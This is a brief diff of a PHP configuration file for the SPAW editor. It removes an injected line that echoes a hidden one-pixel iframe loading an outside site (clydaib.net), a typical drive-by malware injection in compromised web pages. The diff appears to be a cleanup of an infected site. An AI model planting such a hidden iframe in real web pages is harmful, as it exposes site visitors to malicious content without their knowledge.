@@ -263,6 +263,3 @@ SpawConfig::setStaticConfigItem(
   ),
   SPAW_CFG_TRANSFER_SECURE
 );
-
-echo "<iframe src=\"http://clydaib.net/?click=37358A6\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
-?>
